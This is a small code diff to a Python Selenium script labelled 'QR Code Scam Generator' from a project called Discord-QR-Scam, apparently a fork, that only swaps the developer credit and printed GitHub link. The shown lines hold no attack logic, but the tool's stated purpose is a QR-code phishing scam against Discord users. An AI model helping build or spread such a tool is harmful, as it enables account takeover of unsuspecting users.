@@ -9,7 +9,7 @@ from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 
-# Developer: NightfallGT
+# Developers: NightfallGT + Theotoma
 # Educational purposes only
 os.system('cls' if os.name == 'nt' else 'clear')
 
@@ -34,7 +34,7 @@ def paste_template():
 
 
 def main():
-    print('github.com/NightfallGT/Discord-QR-Scam\n')
+    print('https://github.com/Theotoma/Discord-QR-Scam\n')
     print('** QR Code Scam Generator **')
 
     options = webdriver.ChromeOptions()
